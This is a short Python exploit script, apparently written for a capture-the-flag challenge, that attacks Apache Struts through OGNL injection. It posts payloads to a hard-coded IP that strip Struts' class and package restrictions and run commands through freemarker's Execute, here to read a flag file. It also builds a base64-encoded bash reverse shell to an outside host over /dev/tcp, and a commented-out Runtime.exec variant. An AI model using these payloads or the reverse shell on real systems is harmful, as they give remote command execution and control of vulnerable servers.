#-*-coding:utf-8-*-
import requests
import sys
import base64

url = "http://103.30.245.195:5050"
# url = sys.argv[1]
_cmd = "0<&196;exec 196<>/dev/tcp/34.101.220.109/5051; sh <&196 >&196 2>&196"

print(url)
b64_cmd = base64.b64encode(_cmd.encode("UTF-8"))
print(b64_cmd)

payload = "bash -c {echo,%s}|{base64,-d}|{bash,-i}" % b64_cmd.decode("UTF-8")
print(payload)

data1 = {
    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"
}
# _id ='%{{(#context=#attr[\'struts.valueStack\'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(\'{}\'))}}'.format(payload)
_id = '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("cat flag/flag.txt/bendera")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'

#print(_id)
data2 = {
    "id": _id
}
res1 = requests.post(url, data=data1)
res2 = requests.post(url, data=data2)
print(res2.text)